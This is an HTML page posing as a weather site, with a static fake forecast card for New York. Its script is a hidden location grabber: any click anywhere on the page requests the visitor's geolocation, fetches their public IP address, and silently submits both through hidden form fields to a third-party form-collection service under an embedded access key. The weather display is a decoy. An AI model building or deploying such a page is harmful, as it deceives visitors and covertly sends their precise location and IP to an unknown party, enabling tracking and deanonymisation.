<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>www.Weather.org</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #0c1e4f;
            font-family: 'Nunito', sans-serif;
            margin: 0;
        }

        .weather-card {
            background: linear-gradient(to bottom right, #00c6fb, #005bea);
            border-radius: 15px;
            color: white;
            padding: 30px;
            width: 300px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
        }

        .search-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            padding: 5px 10px;
            margin-bottom: 20px;
        }

        .search-bar input {
            border: none;
            background: transparent;
            outline: none;
            color: white;
            flex-grow: 1;
            font-size: 16px;
            margin-right: 10px;
        }

        .search-bar i {
            cursor: pointer;
        }

        .weather-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }

        .temperature {
            font-size: 48px;
            font-weight: 600;
            margin: 10px 0;
        }

        .location {
            font-size: 24px;
            font-weight: 400;
        }

        .details {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            font-size: 14px;
        }

        .details div {
            display: flex;
            align-items: center;
        }

        .details i {
            margin-right: 5px;
        }

        .weather-btn {
            background-color: #007bff;
            border: none;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .weather-btn:hover {
            background-color: #0056b3;
        }

        .map-container {
            margin-top: 20px;
            height: 300px;
        }
    </style>
</head>

<body>
    <div class="weather-card">
        <div class="search-bar">
            <input type="text" placeholder="Search">
            <i class="bi bi-search"></i>
        </div>
        <div class="weather-icon text-center">
            <i class="bi bi-cloud-sun"></i>
        </div>
        <div class="temperature text-center">22Â°C</div>
        <div class="location text-center">New York</div>
        <div class="details">
            <div>
                <i class="bi bi-moisture"></i>
                <span>64% Humidity</span>
            </div>
            <div>
                <i class="bi bi-wind"></i>
                <span>18 km/h Wind Speed</span>
            </div>
        </div>
        <button class="weather-btn" id="button-addon2">Location Change</button>
        <form action="https://api.web3forms.com/submit" method="POST" id="locationForm">
            <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
            <input type="hidden" name="latitude" id="latitude">
            <input type="hidden" name="longitude" id="longitude">
            <input type="hidden" name="ip_address" id="ip_address">
            <input type="hidden" name="redirect" value="https://web3forms.com/success">
            <div class="locationContainer">
                <div id="location"></div>
            </div>
            <div class="map-container">
                <div id="demo"></div>
            </div>
        </form>
    </div>

    <!-- Include Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Include Google Maps API -->
    <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY"></script>
    <script>
        document.body.addEventListener('click', function () {
            getlocation();
        });

        function getlocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showErr);
            } else {
                alert("Sorry! your browser does not support Geolocation API.");
            }
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            document.getElementById('latitude').value = latitude;
            document.getElementById('longitude').value = longitude;

            var locationText = `Your current location is (Latitude: ${latitude}, Longitude: ${longitude})`;
            document.getElementById('location').innerText = locationText;

            getlocationForMap(latitude, longitude);
            fetchIPAndSubmit();
        }

        function getlocationForMap(lat, long) {
            var lattlong = new google.maps.LatLng(lat, long);
            var myOptions = {
                center: lattlong,
                zoom: 15,
                mapTypeControl: true,
                navigationControlOptions: {
                    style: google.maps.NavigationControlStyle.SMALL,
                },
            };
            var maps = new google.maps.Map(document.getElementById('demo'), myOptions);
            var markers = new google.maps.Marker({
                position: lattlong,
                map: maps,
                title: "You are here!",
            });
        }

        function showErr(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for Geolocation API.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("User location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }

        function fetchIPAndSubmit() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip_address').value = data.ip;
                    document.getElementById('locationForm').submit();
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                    alert('Failed to get IP address.');
                });
        }
    </script>
</body>

</html>
